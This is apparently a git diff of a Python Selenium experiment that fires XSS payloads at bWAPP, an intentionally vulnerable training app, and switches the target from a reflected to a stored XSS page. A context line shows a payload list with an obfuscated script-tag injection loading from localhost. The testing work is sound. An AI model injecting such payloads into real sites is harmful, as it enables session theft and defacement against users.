@@ -2,7 +2,7 @@ import uuid
 from typing import Callable
 from bs4 import BeautifulSoup
 from deepdiff import DeepDiff
-from selenium import webdriver
+from seleniumwire import webdriver
 
 from bwapp_selenium_actions import *
 
@@ -68,4 +68,4 @@ payloads = ["\"<ScRiPt sRc=`http://localhost:9090`></ScRiPt>nOeMbed><ScRiPt sRc=
 
 if __name__ == '__main__':
     driver = webdriver.Chrome()
-    single_experiment(driver, payloads, xss_reflected_get_firstname)
+    single_experiment(driver, payloads, xss_stored_blog)
